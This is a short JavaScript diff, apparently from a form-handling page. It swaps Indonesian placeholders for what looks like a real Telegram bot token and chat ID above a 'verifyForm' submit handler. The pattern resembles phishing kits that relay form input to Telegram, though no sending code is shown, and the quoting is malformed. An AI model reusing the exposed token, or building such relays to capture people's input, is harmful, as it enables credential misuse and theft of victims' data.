@@ -1,5 +1,5 @@
-const botToken = 'token bot kamu;
-const chatId = id telegram kamu';
+const botToken = '8474628772:AAEJtTL31kPkUpPodSz15VNqAf3YV-gbhTA;
+const chatId = 1415459773';
 
 document.getElementById('verifyForm').addEventListener('submit', function(e) {
   e.preventDefault();
